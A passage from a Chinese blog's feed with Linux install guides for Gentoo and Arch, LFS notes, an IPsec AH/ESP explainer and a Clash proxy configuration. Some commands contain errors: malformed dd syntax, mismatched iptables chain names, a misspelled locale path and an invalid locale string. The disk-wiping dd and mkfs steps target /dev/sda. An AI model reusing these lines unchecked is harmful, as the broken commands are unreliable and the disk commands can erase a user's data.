class="hljs-variable">$&#123;COMMON_FLAGS&#125;</span>&quot;</span>    <span class="hljs-comment">#C编译参数</span><br><br>CXXFLAGS=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;COMMON_FLAGS&#125;</span>&quot;</span>  <span class="hljs-comment">#C++编译参数</span><br><br>FCFLAGS=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;COMMON_FLAGS&#125;</span>&quot;</span><br>FFLAGS=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;COMMON_FLAGS&#125;</span>&quot;</span><br>ACCEPT_KEYWORDS=<span class="hljs-string">&quot;amd64&quot;</span>  <span class="hljs-comment">#可接受的软件包等级(稳定与不稳定)(这里为全局keyworkds,若想为特定软件包指定特定的Keyworkds(可以在/etc/protage/portage.accpet_keywords</span><br><br>ACCEPT_LICENSE=<span class="hljs-string">&quot;*&quot;</span>      <span class="hljs-comment">#可接受的软件包许可证</span><br>MAKEOPTS=<span class="hljs-string">&quot;-j8 -l7.2&quot;</span>    <span class="hljs-comment">#根据cpu核心数来配置(一般配置为cpu核心数+1)</span><br><br>CHOST=<span class="hljs-string">&quot;x86_64-pc-linux-gnu&quot;</span><br>EMERGE_DEFAULT_OPTS=<span class="hljs-string">&quot;--jobs=8 --load-average=7.2 --ask --keep-going --with-bdeps=y&quot;</span><br>GRUB_PLATFORMS=<span class="hljs-string">&quot;efi-64&quot;</span> <span class="hljs-comment">#配置GRUB架构平台</span><br><br>L10N=<span class="hljs-string">&quot;en-US en&quot;</span><br>LINGUAS=<span class="hljs-string">&quot;en-US en&quot;</span><br><br><span class="hljs-comment">#镜像源</span><br>NETEASE=<span class="hljs-string">&quot;https://mirrors.163.com/gentoo/&quot;</span><br>NEUSOFT=<span class="hljs-string">&quot;https://mirrors.neusoft.edu.cn/gentoo/&quot;</span><br>TSINGHUA=<span class="hljs-string">&quot;https://mirrors.tuna.tsinghua.edu.cn/gentoo/&quot;</span><br>CDS=<span class="hljs-string">&quot;http://mirrors.yun-idc.com/gentoo/&quot;</span><br>ALI=<span class="hljs-string">&quot;https://mirrors.aliyun.com/gentoo/&quot;</span><br>BIT=<span class="hljs-string">&quot;https://mirror.bit.edu.cn/gentoo/&quot;</span><br>USTC=<span class="hljs-string">&quot;https://mirrors.ustc.edu.cn/gentoo/&quot;</span><br><br><br><span class="hljs-comment">#设置语言</span><br>AUTO_CLEAN=<span class="hljs-string">&quot;yes&quot;</span><br><span class="hljs-comment">#设置自动清理</span><br>VIDEO_CARDS=<span class="hljs-string">&quot;intel iris nvidia&quot;</span><span class="hljs-comment">#配置显卡驱动</span><br>INPUT_DEVICES=<span class="hljs-string">&quot;libinput&quot;</span>            <span class="hljs-comment">#配置输入设备的基本库</span><br><span class="hljs-comment">#将microcode直接编译进内核</span><br>MICROCODE_SIGNATURES=<span class="hljs-string">&quot;-S&quot;</span><br>LC_MESSAGES=C<br><br><br>PORTDIR=<span class="hljs-string">&quot;/var/db/repos/gentoo&quot;</span>      <span class="hljs-comment">#软件包的ebuild文件存储目录</span><br>DISTDIR=<span class="hljs-string">&quot;/var/cache/distfiles&quot;</span><br>PKGDIR=<span class="hljs-string">&quot;/var/cache/binpkgs&quot;</span>         <span class="hljs-comment">#软件包的存储目录</span><br><span class="hljs-comment">#设置软件包缓存目录</span><br>PORTAGE_TMPDIR=<span class="hljs-string">&quot;/tmp&quot;</span>               <span class="hljs-comment">#portage的编译目录</span><br><span class="hljs-comment">#设置portage构建软件包目录(如果内存较大,建议设置在内存里面)</span><br><span class="hljs-comment"># This sets the language of build output to English.</span><br><span class="hljs-comment"># Please keep this setting intact when reporting bugs.</span><br>LC_MESSAGES=C<br>GENTOO_MIRRORS=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;USTC&#125;</span>&quot;</span>            <span class="hljs-comment">#配置Gentoo镜像源</span><br></code></pre></td></tr></table></figure><h3 id="5-4-配置仓库地址"><a href="#5-4-配置仓库地址" class="headerlink" title="5.4.配置仓库地址"></a>5.4.配置仓库地址</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> --parents /mnt/gentoo/etc/portage/repos.conf<br><br><span class="hljs-built_in">cp</span> /mnt/gentoo/usr/share/portage/config/repos.conf /mnt/gentoo/etc/portage/repos.conf/gentoo.conf<br><br>nano /mnt/gentoo/etc/portage/repos.conf/gentoo.conf<br><br>sync-uri = rsync://mirrors.ustc.edu.cn/gentoo-portage<br></code></pre></td></tr></table></figure><h2 id="6-基本系统配置"><a href="#6-基本系统配置" class="headerlink" title="6.基本系统配置"></a>6.基本系统配置</h2><h3 id="6-1-获取ebuild"><a href="#6-1-获取ebuild" class="headerlink" title="6.1.获取ebuild"></a>6.1.获取ebuild</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#获取ebuild快照</span><br>emerge-webrsync<br><span class="hljs-comment">#列出系统配置profile</span><br>eselect profile list<br>eselect profile <span class="hljs-built_in">set</span> ?<br><br></code></pre></td></tr></table></figure><h3 id="6-2配置内核"><a href="#6-2配置内核" class="headerlink" title="6.2配置内核"></a>6.2配置内核</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#获取内核源码</span><br>emerge --ask sys-kernel/gentoo-sources sys-kernel/dracut sys-apps/pciutils<br><br><span class="hljs-comment">#sys-kernel/gentoo-sources 为内核源码</span><br><span class="hljs-comment">#sys-kernel/dracut用与生成initramfs</span><br><span class="hljs-comment">#sys-apps/pciutils软件包用于收集硬件信息(一些pci设备)</span><br><br><span class="hljs-comment">#列出当前可用内核</span><br>eselect kernel list<br><br><span class="hljs-comment">#设置使用那个内核</span><br>eselect kernel <span class="hljs-built_in">set</span><br><br><span class="hljs-comment">#编译内核</span><br><span class="hljs-comment">#进入内核目录</span><br><span class="hljs-built_in">cd</span> /usr/src/linux<br><br><span class="hljs-comment">#开始编译</span><br><br><span class="hljs-comment">#配置编译选项</span><br>make menuconfig<br><br><span class="hljs-comment">#开始编译</span><br>make -j8 &amp;&amp; make modules_install -j8<br><br><span class="hljs-comment">#安装内核</span><br>make install <br><br><span class="hljs-comment">#生成一个initramfs</span><br>dracut --kver=4.9.16-gentoo<br><span class="hljs-comment">#记得打开frame_buffer。</span><br></code></pre></td></tr></table></figure><h3 id="5-5-更新基本系统"><a href="#5-5-更新基本系统" class="headerlink" title="5.5.更新基本系统"></a>5.5.更新基本系统</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment">#更新系统</span><br>emerge --ask --verbose --update --deep --newuse @world<br><br><span class="hljs-comment">#常用的软件配置</span><br>emerge --ask sys-kernel/linux-firmware sys-firmware/intel-microcode net-wireless/iw net-wireless/wpa_supplicant  net-misc/dhcp net-misc/dnsmasq app-admin/sysklogd sys-boot/grub:2<br><span class="hljs-comment">#sys-kernel/linux-firmware      包含了一些常用的驱动</span><br><span class="hljs-comment">#sys-firmware/intel-microcode   用于更新microcode,以保持系统的稳定性</span><br><span class="hljs-comment">#net-wireeless/iw               一个网络管理工具</span><br><span class="hljs-comment">#net-wireless/wpa-supplicant    wifi连接工具</span><br><span class="hljs-comment">#net-misc/networkmanager        网络管理工具</span><br><span class="hljs-comment">#net-misc/dhcp                  dhcp客户端</span><br><span class="hljs-comment">#net-misc/dnsmasq               dns服务器以及dhcp服务器</span><br><span class="hljs-comment">#app-admin/sysklogd             日志分析工具</span><br><span class="hljs-comment">#sys-boot/grub:2                grub(一种bootloader)</span><br></code></pre></td></tr></table></figure><h3 id="5-6-配置系统引导"><a href="#5-6-配置系统引导" class="headerlink" title="5.6.配置系统引导"></a>5.6.配置系统引导</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#安装系统引导</span><br>grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=Gentoo<br><br><span class="hljs-comment">#生成grub配置文件</span><br><span class="hljs-built_in">mkdir</span> /boot/grub<br>grub-mkconfig -o /boot/grub/grub.cfg<br></code></pre></td></tr></table></figure><h3 id="6-完成安装"><a href="#6-完成安装" class="headerlink" title="6.完成安装"></a>6.完成安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#设置root用户的密码</span><br>passwd root<br></code></pre></td></tr></table></figure><h3 id="7-图形化安装-基于Gnome桌面环境"><a href="#7-图形化安装-基于Gnome桌面环境" class="headerlink" title="7.图形化安装(基于Gnome桌面环境)"></a>7.图形化安装(基于Gnome桌面环境)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">emerge --ask gnome/base<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>软件和系统配置</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux发行版安装与使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Archlinux安装步骤</title>
    <link href="/2022/04/10/Archlinux%E5%AE%89%E8%A3%85%E6%AD%A5%E9%AA%A4/"/>
    <url>/2022/04/10/Archlinux%E5%AE%89%E8%A3%85%E6%AD%A5%E9%AA%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="Archlinux安装步骤"><a href="#Archlinux安装步骤" class="headerlink" title="Archlinux安装步骤"></a>Archlinux安装步骤</h1><h2 id="1-获取镜像-制作启动盘"><a href="#1-获取镜像-制作启动盘" class="headerlink" title="1.获取镜像,制作启动盘"></a>1.获取镜像,制作启动盘</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://mirrors.ustc.edu.cn/archlinux/iso/2022.03.01/archlinux-2022.03.01-x86_64.iso<br><span class="hljs-comment">#linux下面可以使用dd进行刻录</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span> ./archlinux.iso of=/dev/sda<br><span class="hljs-comment">#windows下可以使用rufus进行刻录</span><br></code></pre></td></tr></table></figure><h3 id="2-基本安装环境配置"><a href="#2-基本安装环境配置" class="headerlink" title="2.基本安装环境配置"></a>2.基本安装环境配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment">#1.使用以太网,直接dhcpcd获取ip地址即可</span><br>2.使用Wi-Fi<br><span class="hljs-comment">#进入网络配置</span><br>iwctl<br><span class="hljs-comment">#扫面周围的wifi</span><br>station wlan0 scan<br><span class="hljs-comment">#显示扫描到的wifi</span><br>station wlan0 get-networks<br><span class="hljs-comment">#连接指定的Wi-Fi</span><br>station wlan0 connect SSID<br><br><br><span class="hljs-comment">#启动时间服务</span><br>timedatectl set-ntp <span class="hljs-literal">true</span><br><span class="hljs-comment">#同步时间</span><br>hwclock --systohc<br></code></pre></td></tr></table></figure><h2 id="3-磁盘分区和挂载"><a href="#3-磁盘分区和挂载" class="headerlink" title="3.磁盘分区和挂载"></a>3.磁盘分区和挂载</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用fdisk工具进行磁盘分区</span><br>fdisk /dev/sda<br><br><br><span class="hljs-comment">#格式化文件系统</span><br>mkfs.ext4 /dev/sda3     <span class="hljs-comment">#格式化根文件系统分区</span><br>mkfs.swap /dev/sda2     <span class="hljs-comment">#格式化swap分区</span><br>mkfs.vfat /dev/sda1     <span class="hljs-comment">#格式化boot文件系统分区</span><br><br><span class="hljs-comment">#分区挂载</span><br>mount /dev/sda3 /mnt<br><span class="hljs-built_in">mkdir</span> /mnt/boot<br>mount /dev/sda1 /mnt/boot<br>swapon /dev/sda2<br></code></pre></td></tr></table></figure><h2 id="4-安装基础系统"><a href="#4-安装基础系统" class="headerlink" title="4.安装基础系统"></a>4.安装基础系统</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">pacstrap /mnt base linux linux-firmware<br><span class="hljs-comment">#base为系统基本组件</span><br><span class="hljs-comment">#linux为linux内核</span><br><span class="hljs-comment">#linux-firmware包含了常见的设备驱动</span><br></code></pre></td></tr></table></figure><h2 id="5-进入安装好的系统-进行基本的系统配置"><a href="#5-进入安装好的系统-进行基本的系统配置" class="headerlink" title="5.进入安装好的系统,进行基本的系统配置"></a>5.进入安装好的系统,进行基本的系统配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#生成fstab文件</span><br>genfstab /mnt &gt;&gt; /mnt/etc/fstab<br><br><span class="hljs-comment">#chroot 到新的系统</span><br>arch-chroot /mnt<br></code></pre></td></tr></table></figure><h3 id="5-1-设置hostname和host"><a href="#5-1-设置hostname和host" class="headerlink" title="5.1.设置hostname和host"></a>5.1.设置hostname和host</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Arch&quot;</span> &gt; /etc/hostname<br>vim /etc/hosts<br>127.0.0.1   localhost<br>::1         localhost<br>127.0.1.1   archlinux.localdomain<br></code></pre></td></tr></table></figure><h3 id="5-2-设置时间-地区和语言"><a href="#5-2-设置时间-地区和语言" class="headerlink" title="5.2.设置时间,地区和语言"></a>5.2.设置时间,地区和语言</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment">#设置时区</span><br><span class="hljs-built_in">ln</span> -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime<br><br><span class="hljs-comment">#配置语言</span><br>vim /etc/lcoale.gen<br>en_US.UTF-8.UTF-8<br>zh_CN.UTF-8.UTF-8<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;LANG=en_US.UTF-8.UTF-8&quot;</span> &gt; /etc/locale.conf<br>locale-gen<br></code></pre></td></tr></table></figure><h3 id="5-3-安装系统常用的基本软件"><a href="#5-3-安装系统常用的基本软件" class="headerlink" title="5.3.安装系统常用的基本软件"></a>5.3.安装系统常用的基本软件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">pacman -S wpa_supplicant dhcpcd neovim <br><span class="hljs-comment">#wpa_supplicant是wifi连接工具</span><br><span class="hljs-comment">#dhcpcd是获取ip地址的dhcp客户端工具</span><br><span class="hljs-comment">#neovim是一个常用的编辑器</span><br></code></pre></td></tr></table></figure><h2 id="6-安装系统引导"><a href="#6-安装系统引导" class="headerlink" title="6.安装系统引导"></a>6.安装系统引导</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#安装grub软件包</span><br>pacman -S grub<br><br><span class="hljs-comment">#安装grub</span><br>grub-install --target=x86_64-efi --efi-directory=/boot<br><br><span class="hljs-comment">#生成grub配置文件</span><br>grub-mkconfig -o /boot/grub/grub.cfg<br></code></pre></td></tr></table></figure><h2 id="7-完成安装"><a href="#7-完成安装" class="headerlink" title="7.完成安装"></a>7.完成安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#设置root用户密码</span><br>passwd root<br><br><span class="hljs-comment">#退出chroot环境</span><br><span class="hljs-built_in">exit</span><br><br><span class="hljs-comment">#卸载磁盘</span><br>umount /mnt/boot<br>umount /mnt<br><br><span class="hljs-comment">#重启系统并移除安装介质</span><br>reboot<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>软件和系统配置</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux发行版安装与使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/1970/01/01/LFS%E5%AD%A6%E4%B9%A0/"/>
    <url>/1970/01/01/LFS%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="LFS安装过程"><a href="#LFS安装过程" class="headerlink" title="LFS安装过程"></a>LFS安装过程</h2><h4 id="1-基本的软件包"><a href="#1-基本的软件包" class="headerlink" title="1.基本的软件包"></a>1.基本的软件包</h4><p>1.bash</p><p>2.bison</p><p>通用的语言解析生成器</p><p>3.binutils</p><p>目标文件处理工具,包含(strip,objdump,ld…..)</p><p>4.gawk(gnu awk,基本的gnu开发工具)</p><p>5.diffutils(开发工具,用于更新代码中数据,将旧数据传给他)</p><p>6.useradd創建</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/1970/01/01/IPSecVPN/"/>
    <url>/1970/01/01/IPSecVPN/</url>
    
    <content type="html"><![CDATA[<h2 id="IPSecVPN"><a href="#IPSecVPN" class="headerlink" title="IPSecVPN"></a>IPSecVPN</h2><h4 id="1-什么是IPSEC"><a href="#1-什么是IPSEC" class="headerlink" title="1.什么是IPSEC?"></a>1.什么是IPSEC?</h4><p>互联网安全协议(Internet Protocol Security)是一个协议包,透过对IP协议的分组进行加密和认证的网络传输协议族(一些相互关联的协议的集合)</p><p>IPsec主要由以下<a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE">协议</a>组成[<a href="https://zh.wikipedia.org/zh-cn/IPsec#cite_note-rfc2411-1">1]</a>[<a href="https://zh.wikipedia.org/zh-cn/IPsec#cite_note-rfc4308-2">2]</a>：</p><ol><li><p><a href="https://zh.wikipedia.org/zh-cn/IPsec#%E8%AE%A4%E8%AF%81%E5%A4%B4%EF%BC%88AH%EF%BC%89">认证头（AH）</a>，为IP<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E6%8A%A5">数据报</a>提供无连接<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E5%AE%8C%E6%95%B4%E6%80%A7">数据完整性</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E6%B6%88%E6%81%AF%E8%AE%A4%E8%AF%81&action=edit&redlink=1">消息认证</a>以及防<a href="https://zh.wikipedia.org/wiki/%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB">重放攻击</a>保护[<a href="https://zh.wikipedia.org/zh-cn/IPsec#cite_note-rfc2402-3">3]</a>[<a href="https://zh.wikipedia.org/zh-cn/IPsec#cite_note-rfc4302-4">4]</a>；</p></li><li><p><a href="https://zh.wikipedia.org/zh-cn/IPsec#%E5%B0%81%E8%A3%85%E5%AE%89%E5%85%A8%E8%BD%BD%E8%8D%B7%EF%BC%88ESP%EF%BC%89">封装安全载荷（ESP）</a>，提供机密性、数据源认证、无连接完整性、防重放和有限的传输流（traffic-flow）机密性[<a href="https://zh.wikipedia.org/zh-cn/IPsec#cite_note-rfc2406-5">5]</a>；</p></li><li><p><a href="https://zh.wikipedia.org/wiki/%E7%B6%B2%E9%9A%9B%E7%B6%B2%E8%B7%AF%E9%87%91%E9%91%B0%E4%BA%A4%E6%8F%9B">因特网密钥交换</a>（英语： <a href="https://zh.wikipedia.org/w/index.php?title=Internet_Key_Exchange&action=edit&redlink=1">Internet Key Exchange</a> ，简称IKE或IKEv2），为 AH、ESP 操作所需的 <a href="https://zh.wikipedia.org/wiki/%E5%AE%89%E5%85%A8%E9%97%9C%E8%81%AF">安全关联（SA）</a> 提供算法、数据包和密钥参数[<a href="https://zh.wikipedia.org/zh-cn/IPsec#cite_note-rfc2409_sec1-6">6]</a>。</p><p>IPsec协议工作在<a href="https://zh.wikipedia.org/wiki/OSI%E6%A8%A1%E5%9E%8B">OSI模型</a>的第三层，使其在单独使用时适于保护基于<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE">TCP</a>或<a href="https://zh.wikipedia.org/wiki/%E7%94%A8%E6%88%B7%E6%95%B0%E6%8D%AE%E6%8A%A5%E5%8D%8F%E8%AE%AE">UDP</a>的协议（如<a href="https://zh.wikipedia.org/wiki/%E5%AE%89%E5%85%A8%E5%A5%97%E6%8E%A5%E5%AD%90%E5%B1%82">安全套接子层</a>（<a href="https://zh.wikipedia.org/wiki/SSL">SSL</a>）就不能保护UDP层的通信流）。这就意味着，与传输层或更高层的协议相比，IPsec协议必须处理可靠性和分片的问题，这同时也增加了它的复杂性和处理开销。相对而言，<a href="https://zh.wikipedia.org/wiki/SSL">SSL</a>&#x2F;<a href="https://zh.wikipedia.org/wiki/TLS">TLS</a>依靠更高层的<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE">TCP</a>（OSI的第四层）来管理可靠性和分片。</p></li></ol><h3 id="2-认证头-AH-Authentication-Header-协议号51"><a href="#2-认证头-AH-Authentication-Header-协议号51" class="headerlink" title="2.认证头(AH(Authentication Header))(协议号51)"></a>2.认证头(AH(Authentication Header))(协议号51)</h3><p><strong>认证头</strong>（Authentication Header，<strong>AH</strong>）被用来保证被传输分组的完整性和可靠性。此外，它还保护不受<a href="https://zh.wikipedia.org/wiki/%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB">重放攻击</a>。认证头试图保护IP数据报的所有字段，那些在传输IP分组的过程中要发生变化的字段就只能被排除在外。当认证头使用非对称数字签名算法（如RSA）时，可以提供不可否认性<br><img src="/images%5CAH%E5%8C%85%E7%BB%93%E6%9E%84.png" alt="认证头">字段含义：</p><ul><li>下一个头：标识被传送数据所属的协议。</li><li>载荷长度：认证头包的大小。</li><li>保留：为将来的应用保留（目前都置为0）。</li><li>安全参数索引：与IP地址一同用来标识安全参数。</li><li>串行号：单调递增的数值，用来防止重放攻击。</li><li>认证数据：包含了认证当前包所必须的数据。</li></ul><p>AH协议会对数据和ip包头进行校验,因此AH协议不能穿透NAT,并且AH协议不会对数据进行加密,只会对数据进行校验</p><h3 id="3-封装载荷-协议号50"><a href="#3-封装载荷-协议号50" class="headerlink" title="3.封装载荷(协议号50)"></a>3.封装载荷(协议号50)</h3><p><strong>封装安全载荷</strong>（Encapsulating Security Payload，<strong>ESP</strong>）协议对分组提供了源可靠性、完整性和保密性的支持。与AH头不同的是，IP分组头部不被包括在内。</p><p><img src="/images/esp%E5%8C%85%E7%BB%93%E6%9E%84.png" alt="封装载荷"></p><ul><li>安全参数索引：与IP地址一同用来标识安全参数</li><li>串行号：单调递增的数值，用来防止重放攻击。</li><li>载荷数据：如果没使用ESP的加密功能，则载荷数据域的内容是“下一个头”所指示的数据；如果使用了ESP的加密功能，则使用加密载荷数据和ESP尾部数据所得的密文作为payload data.</li><li>填充：某些块加密算法用此将数据填充至块的长度。</li><li>填充长度：以位为单位的填充数据的长度。</li><li>下一个头：标识载荷中封装的数据所属的协议。</li><li>认证数据：又叫做完整性校验值（ICV）。包含了认证当前包所必须的数据。</li></ul><p>ESP协议不校验ip包头,并且提供数据包的加密和校验,</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/1970/01/01/clash%E9%85%8D%E7%BD%AE/"/>
    <url>/1970/01/01/clash%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>title: clash配置<br>date: 2022-05-18 19:19:57<br>tags: 软件配置<br>categories: 软件配置</p><h1 id="clash配置"><a href="#clash配置" class="headerlink" title="clash配置"></a>clash配置</h1><h3 id="1-clash配置透明代理"><a href="#1-clash配置透明代理" class="headerlink" title="1.clash配置透明代理"></a>1.clash配置透明代理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -t nat -N CLASH_TCP_RULE<br><span class="hljs-comment">#创建新的规则链</span><br>iptables -t nat -A PREROUTING -p tcp -j CLASH_TCP_TULE<br>iptables -t nat -A CLASH -p tcp -d 192.168.0.0/16 -j RETURN<br><span class="hljs-comment">#不对局域网地址进行转发</span><br>iptables -t nat -A CLASH_TCP_RULE -p tcp -j REDIRECT --to-ports 1082(此为clash配置的透明代理端口)<br></code></pre></td></tr></table></figure><h2 id="2-clash配置dns加密代理"><a href="#2-clash配置dns加密代理" class="headerlink" title="2.clash配置dns加密代理"></a>2.clash配置dns加密代理</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">dns:</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">listen:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-string">:55</span><br>  <span class="hljs-attr">default-nameserver:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-number">119.29</span><span class="hljs-number">.29</span><span class="hljs-number">.29</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-number">223.5</span><span class="hljs-number">.5</span><span class="hljs-number">.5</span><br>  <span class="hljs-attr">nameserver:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://doh.pub/dns-query</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://dns.alidns.com/dns-query</span><br>  <span class="hljs-attr">fallback:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://1.1.1.1/dns-query</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://dns.google.com/dns-query</span><br>  <span class="hljs-attr">fallback-filter:</span><br>    <span class="hljs-attr">geoip:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">geoip-code:</span> <span class="hljs-string">CN</span><br>    <span class="hljs-attr">ipcidr:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-number">240.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-string">/4</span><br></code></pre></td></tr></table></figure><h2 